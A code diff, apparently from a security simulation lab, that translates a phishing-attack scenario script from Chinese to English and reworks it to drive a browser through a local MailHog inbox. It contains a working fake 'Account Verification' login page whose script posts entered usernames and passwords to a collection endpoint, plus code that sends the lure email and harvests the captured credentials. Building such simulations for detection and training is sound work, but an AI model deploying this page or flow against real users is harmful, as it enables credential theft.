@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-钓鱼攻击脚本 - 实现真实的钓鱼邮件攻击
+Phishing attack script - Implement real phishing email attacks
 """
 
 import time
@@ -16,17 +16,17 @@ from selenium.webdriver.support import expected_conditions as EC
 from logger_utils import log_attack_event
 from scenarios.phishing.labels import deliver, exploit, credential_theft, email_opened, link_clicked, form_submitted, c2_communication
 
-# 配置日志
+# Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 def create_phishing_page():
-    """创建钓鱼页面HTML"""
+    """Create phishing page HTML"""
     return """
     <!DOCTYPE html>
     <html>
     <head>
-        <title>账户验证 - 请登录</title>
+        <title>Account Verification - Please Login</title>
         <style>
             body { font-family: Arial, sans-serif; margin: 40px; }
             .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
@@ -36,12 +36,12 @@ def create_phishing_page():
     </head>
     <body>
         <div class="login-form">
-            <h2>账户验证</h2>
-            <p>为了确保您的账户安全，请重新验证您的登录信息：</p>
+            <h2>Account Verification</h2>
+            <p>To ensure your account security, please re-verify your login information:</p>
             <form id="loginForm">
-                <input type="text" id="username" placeholder="用户名/邮箱" required>
-                <input type="password" id="password" placeholder="密码" required>
-                <button type="submit">验证账户</button>
+                <input type="text" id="username" placeholder="Username/Email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Verify Account</button>
             </form>
         </div>
         <script>
@@ -50,7 +50,7 @@ def create_phishing_page():
                 var username = document.getElementById('username').value;
                 var password = document.getElementById('password').value;
                 
-                // 发送凭证到收集服务器
+                // Send credentials to collection server
                 fetch('/collect', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -61,7 +61,7 @@ def create_phishing_page():
                     })
                 }).then(response => response.json())
                 .then(data => {
-                    alert('验证成功！您的账户已安全。');
+                    alert('Verification successful! Your account is secure.');
                 });
             });
         </script>
@@ -70,7 +70,7 @@ def create_phishing_page():
     """
 
 def setup_browser(params):
-    """设置浏览器"""
+    """Setup browser"""
     options = Options()
     if params.get("browser", {}).get("headless", True):
         options.add_argument("--headless")
@@ -85,17 +85,17 @@ def setup_browser(params):
     return driver
 
 def send_phishing_email(params):
-    """发送钓鱼邮件"""
+    """Send phishing email"""
     try:
-        # 使用curl发送邮件到MailHog
+        # Use curl to send email to MailHog
         email_data = {
             "from": params["phishing_email"]["sender"],
             "to": ["victim@company.com"],
             "subject": params["phishing_email"]["subject"],
-            "body": params["phishing_email"]["body"] + f"\n\n点击链接: {params['target_link']}"
+            "body": params["phishing_email"]["body"] + f"\n\nClick link: {params['target_link']}"
         }
         
-        # 发送邮件
+        # Send email
         response = requests.post(
             f"{params['mail_server']['web_ui']}/api/v1/messages",
             json=email_data,
@@ -103,134 +103,185 @@ def send_phishing_email(params):
         )
         
         if response.status_code == 200:
-            logger.info("钓鱼邮件发送成功")
+            logger.info("Phishing email sent successfully")
             log_attack_event("phishing_email_sent", {
                 "subject": email_data["subject"],
                 "target": email_data["to"][0]
             })
             return True
         else:
-            logger.error(f"发送邮件失败: {response.status_code}")
+            logger.error(f"Failed to send email: {response.status_code}")
             return False
             
     except Exception as e:
-        logger.error(f"发送钓鱼邮件时出错: {e}")
+        logger.error(f"Error sending phishing email: {e}")
         return False
 
 def simulate_email_opening(params):
-    """模拟邮件打开"""
+    """Simulate email opening and link clicking"""
     try:
-        # 访问MailHog Web UI查看邮件
-        mail_ui_url = params["mail_server"]["web_ui"]
-        logger.info(f"访问邮件界面: {mail_ui_url}")
+        driver = setup_browser(params)
         
-        response = requests.get(mail_ui_url, timeout=10)
-        if response.status_code == 200:
-            logger.info("成功访问邮件界面")
-            email_opened()
-            return True
+        # 1. Access MailHog Web UI to view emails
+        mail_ui_url = params["mail_server"]["web_ui"]
+        logger.info(f"Accessing email interface: {mail_ui_url}")
+        driver.get(mail_ui_url)
+        
+        # Wait for email list to load
+        WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, ".messages"))
+        )
+        
+        # 2. Click the first email (phishing email)
+        logger.info("Clicking phishing email...")
+        first_email = driver.find_element(By.CSS_SELECTOR, ".messages .message")
+        first_email.click()
+        
+        # Wait for email content to load
+        WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, ".message-content"))
+        )
+        
+        email_opened()
+        logger.info("Successfully opened phishing email")
+        
+        # 3. Find and click phishing link in email
+        logger.info("Looking for phishing link in email...")
+        target_link = params["target_link"]
+        
+        # Find elements containing target link
+        link_elements = driver.find_elements(By.TAG_NAME, "a")
+        phishing_link = None
+        
+        for link in link_elements:
+            href = link.get_attribute("href")
+            if href and target_link in href:
+                phishing_link = link
+                break
+        
+        if phishing_link:
+            logger.info("Found phishing link, preparing to click...")
+            # Record click event
+            link_clicked()
+            log_attack_event("email_link_clicked", {"url": target_link})
+            
+            # Click link (will open in new window)
+            phishing_link.click()
+            
+            # Wait for new window to open
+            time.sleep(2)
+            
+            # Switch to new window
+            windows = driver.window_handles
+            if len(windows) > 1:
+                driver.switch_to.window(windows[-1])  # Switch to latest opened window
+                
+                # Wait for phishing page to load
+                WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.ID, "loginForm"))
+                )
+                
+                logger.info("Successfully accessed phishing page via email link")
+                return driver  # Return driver for subsequent operations
+            else:
+                logger.warning("New window not opened, directly accessing phishing page")
+                driver.get(target_link)
+                return driver
         else:
-            logger.error(f"访问邮件界面失败: {response.status_code}")
-            return False
+            logger.warning("Phishing link not found, directly accessing phishing page")
+            driver.get(target_link)
+            return driver
             
     except Exception as e:
-        logger.error(f"模拟邮件打开时出错: {e}")
-        return False
+        logger.error(f"Error simulating email opening: {e}")
+        if driver:
+            driver.quit()
+        return None
 
 def run(params):
     """
-    执行钓鱼攻击
+    Execute phishing attack
     
     Args:
-        params: 场景参数字典
+        params: Scenario parameters dictionary
     """
-    logger.info("开始执行钓鱼攻击...")
+    logger.info("Starting phishing attack...")
     deliver()
     
     try:
-        # 1. 发送钓鱼邮件
-        logger.info("步骤1: 发送钓鱼邮件")
+        # 1. Send phishing email
+        logger.info("Step 1: Send phishing email")
         if not send_phishing_email(params):
-            logger.error("发送钓鱼邮件失败")
+            logger.error("Failed to send phishing email")
             return
         
-        # 2. 模拟邮件打开
-        logger.info("步骤2: 模拟邮件打开")
-        if not simulate_email_opening(params):
-            logger.error("模拟邮件打开失败")
+        # 2. Simulate email opening and click phishing link
+        logger.info("Step 2: Simulate email opening and click phishing link")
+        driver = simulate_email_opening(params)
+        if not driver:
+            logger.error("Failed to simulate email opening")
             return
         
-        # 3. 启动凭证收集服务器（如果还没有运行）
-        logger.info("步骤3: 确保凭证收集服务器运行")
-        
-        # 4. 使用浏览器自动化点击钓鱼链接
-        logger.info("步骤4: 浏览器自动化点击钓鱼链接")
+        # 3. Ensure credential collection server is running
+        logger.info("Step 3: Ensure credential collection server is running")
         exploit()
         
-        driver = None
         try:
-            driver = setup_browser(params)
+            # Record page access event
+            log_attack_event("phishing_page_accessed", {"url": params["target_link"]})
             
-            # 访问钓鱼页面
-            target_url = params["target_link"]
-            logger.info(f"访问钓鱼页面: {target_url}")
-            driver.get(target_url)
-            
-            link_clicked()
-            log_attack_event("phishing_page_accessed", {"url": target_url})
-            
-            # 等待页面加载
+            # Wait for page to load
             WebDriverWait(driver, 10).until(
                 EC.presence_of_element_located((By.ID, "loginForm"))
             )
             
-            # 填写表单
-            logger.info("填写钓鱼表单...")
+            # Fill form
+            logger.info("Filling phishing form...")
             username_field = driver.find_element(By.ID, "username")
             password_field = driver.find_element(By.ID, "password")
             
-            # 模拟用户输入
+            # Simulate user input
             username_field.send_keys("test_user@company.com")
             time.sleep(1)
             password_field.send_keys("test_password123")
             time.sleep(1)
             
-            # 提交表单
-            logger.info("提交钓鱼表单...")
+            # Submit form
+            logger.info("Submitting phishing form...")
             submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
             submit_button.click()
             
             form_submitted()
             credential_theft()
             
-            # 等待提交完成
+            # Wait for submission to complete
             time.sleep(3)
             
-            # 验证凭证是否被收集
-            logger.info("验证凭证收集...")
+            # Verify credentials were collected
+            logger.info("Verifying credential collection...")
             try:
                 response = requests.get(f"{params['capture_endpoint'].replace('/collect', '/credentials')}", timeout=10)
                 if response.status_code == 200:
                     credentials = response.json()
-                    logger.info(f"成功收集到 {credentials.get('count', 0)} 条凭证")
+                    logger.info(f"Successfully collected {credentials.get('count', 0)} credentials")
                     c2_communication()
                     log_attack_event("credentials_collected", {
                         "count": credentials.get('count', 0),
                         "credentials": credentials.get('credentials', [])
                     })
                 else:
-                    logger.warning("无法验证凭证收集状态")
+                    logger.warning("Unable to verify credential collection status")
             except Exception as e:
-                logger.warning(f"验证凭证收集时出错: {e}")
+                logger.warning(f"Error verifying credential collection: {e}")
             
         finally:
             if driver:
                 driver.quit()
         
-        logger.info("钓鱼攻击执行完成")
+        logger.info("Phishing attack execution completed")
         log_attack_event("phishing_attack_complete")
         
     except Exception as e:
-        logger.error(f"钓鱼攻击执行失败: {e}")
+        logger.error(f"Phishing attack execution failed: {e}")
         log_attack_event("phishing_attack_failed", {"error": str(e)})
         raise
